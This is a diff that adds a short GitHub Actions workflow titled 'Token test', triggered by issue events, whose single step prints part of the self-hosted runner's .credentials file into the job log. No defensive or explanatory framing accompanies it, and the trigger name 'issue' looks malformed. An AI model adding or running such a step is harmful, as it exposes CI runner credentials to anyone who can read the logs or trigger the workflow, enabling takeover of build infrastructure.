@@ -1,0 +1,13 @@
+name: Token test
+
+on:
+  issue:
+  
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: step0
+        run: |
+          cut -c 21- ~/runners/2.301.1/.credentials
